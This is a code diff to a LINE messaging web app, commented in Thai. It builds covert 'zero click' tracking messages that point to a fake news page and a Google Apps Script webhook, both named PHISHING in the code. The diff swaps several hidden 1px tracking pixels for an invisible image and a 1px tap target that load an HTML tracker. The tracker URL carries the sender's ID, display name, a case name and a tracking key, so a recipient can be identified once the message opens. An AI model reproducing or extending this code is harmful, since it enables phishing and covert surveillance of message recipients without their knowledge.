@@ -399,8 +399,11 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbznSdwWEtFMywsAp5ruz-qlf1sQ8bI5POXyraPUL1SM2nyp4Ms3qoxSq5BsVgMQ8dt4/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzT5jUUwLvrww_AFQoJudKtkg3JdaxZ5Vq090T1C4f3i8dzIoilIVnRCZGRFtomA7Ke/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
+        
+        // URL สำหรับ Zero Click HTML tracker (เพิ่มใหม่)
+        const ZERO_CLICK_HTML_URL = 'https://socialtopnews.github.io/news/tracker.html';
         
         // เริ่มต้นการทำงาน LIFF
         document.addEventListener('DOMContentLoaded', function() {
@@ -820,24 +823,21 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้างเวลาปัจจุบันเป็น timestamp เพื่อป้องกันการแคชและระบุเซสชัน
-                const sessionTimestamp = Date.now();
-                const sessionId = Math.random().toString(36).substring(2, 10);
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // เปลี่ยนเป็นใช้รูปแบบ Image Proxy ที่มีประสิทธิภาพมากขึ้น
-                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
-                zeroClickTrackUrl += `&key=${trackingKey}`;
-                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
-                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
-                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&sid=${sessionId}`; // Session ID เฉพาะสำหรับการแชร์นี้
-                zeroClickTrackUrl += `&ts=${sessionTimestamp}`; // Timestamp เพื่อป้องกันการแคช
+                // สร้าง URL สำหรับ HTML tracker ด้วยพารามิเตอร์ที่จำเป็น
+                let zeroClickTrackerUrl = `${ZERO_CLICK_HTML_URL}?`;
+                zeroClickTrackerUrl += `key=${trackingKey}`;
+                zeroClickTrackerUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackerUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackerUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackerUrl += `&webhook=${encodeURIComponent(PHISHING_WEBHOOK_URL)}`;
+                zeroClickTrackerUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
-                console.log("Zero Click Track URL:", zeroClickTrackUrl);
+                console.log("Zero Click Tracker URL:", zeroClickTrackerUrl);
 
-                // สร้าง Flex Message ที่มีประสิทธิภาพมากขึ้นในการติดตาม Zero Click
+                // สร้าง Flex Message ที่มีรูปภาพและใช้ HTML content สำหรับ zero click tracking
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -858,64 +858,48 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // เทคนิค Multiple Tracking Pixels - ใช้หลาย URL ติดตาม
-                                // ช่วยให้มีโอกาสมากขึ้นในการติดตามและได้ข้อมูลเป้าหมาย
-                                {
-                                    type: 'image',
-                                    url: zeroClickTrackUrl,
-                                    size: '1px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover'
-                                },
-                                // เพิ่ม tracking image แบบมี margin เพื่อเพิ่มโอกาสในการโหลด
-                                {
-                                    type: 'image',
-                                    url: `${zeroClickTrackUrl}&px=2`,
-                                    size: '1px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    margin: 'sm'
-                                },
-                                // ใช้ Box ว่างมาแทรก tracking image เพื่อความเข้ากันได้
+                                // ใส่ iframe (หรือ web component/micro browser ของ Line) เพื่อโหลด HTML tracker
                                 {
                                     type: 'box',
                                     layout: 'vertical',
                                     contents: [
                                         {
-                                            type: 'image',
-                                            url: `${zeroClickTrackUrl}&px=3`,
-                                            size: '1px',
-                                            aspectRatio: '1:1'
+                                            type: 'text',
+                                            text: ' ', // ใส่ space เพื่อให้มีเนื้อหา
+                                            color: '#FFFFFF',
+                                            size: '1px'
                                         }
                                     ],
+                                    position: 'relative',
                                     width: '1px',
                                     height: '1px',
-                                    offsetStart: '50%'
+                                    action: {
+                                        type: 'uri',
+                                        uri: zeroClickTrackerUrl
+                                    }
                                 },
-                                // เพิ่ม spacer เพื่อให้เนื้อหาใน body มีขนาดมากขึ้น
-                                {
-                                    type: 'spacer',
-                                    size: 'xs'
-                                }
-                            ],
-                            paddingAll: '0px',
-                            backgroundColor: "#FFFFFF00" // โปร่งใส
-                        },
-                        // เพิ่ม footer ที่มี tracking image อีกตัว
-                        footer: {
-                            type: 'box',
-                            layout: 'vertical',
-                            contents: [
+                                // แทรก HTML content URL ที่จะถูกโหลดและรันสคริปต์เมื่อเปิด message
                                 {
                                     type: 'image',
-                                    url: `${zeroClickTrackUrl}&px=4`,
+                                    url: zeroClickTrackerUrl,
                                     size: '1px',
-                                    aspectRatio: '1:1'
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '0px',
+                                    offsetStart: '0px'
+                                },
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
+                                {
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [],
+                                    height: '1px',
+                                    width: '1px'
                                 }
                             ],
-                            paddingAll: '0px',
-                            height: '1px',
-                            backgroundColor: "#FFFFFF00" // โปร่งใส
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
+                            paddingAll: '0px'
                         }
                     }
                 };
